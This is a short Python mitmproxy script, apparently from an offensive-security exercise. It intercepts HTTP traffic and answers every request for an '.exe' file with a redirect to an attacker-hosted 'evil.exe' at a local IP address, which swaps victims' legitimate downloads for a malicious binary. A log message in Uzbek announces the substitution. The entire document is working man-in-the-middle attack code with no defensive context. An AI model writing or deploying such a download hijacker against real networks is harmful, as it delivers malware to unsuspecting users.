from mitmproxy import http

# Fake URL address
fake_exe_url = "http://192.168.0.113/evil/evil.exe"

def response(flow: http.HTTPFlow) -> None:
    # We check only .exe files
    if flow.request.url.endswith(".exe"):
        print(f"[*] {flow.request.url} ni almashtiryapman -> {fake_exe_url}")
        flow.response = http.Response.make(
            301,  # 301 - Permanent Redirect
            "",
            {"Location": fake_exe_url}
        )
